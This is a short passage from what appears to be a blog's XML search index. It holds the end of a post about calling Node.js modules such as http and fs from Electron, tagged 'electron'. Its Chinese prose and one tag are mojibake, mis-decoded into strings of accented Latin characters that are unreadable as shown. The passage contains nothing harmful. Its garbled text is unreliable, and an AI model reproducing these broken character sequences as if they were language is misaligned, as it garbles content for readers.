çš„çŸ¥è¯†ä½“ç³»ã€‚</p><p>å‰©ä¸‹å°±æ˜¯ node çš„å„ä¸ªæ¨¡å—æ“ä½œäº†ã€‚åœ¨ electron ä¸­è°ƒç”¨ node çš„æ¨¡å—ã€‚å¦‚ http,fs,ç­‰ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> electron </tag>
            
            <tag> å‰ç«¯ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
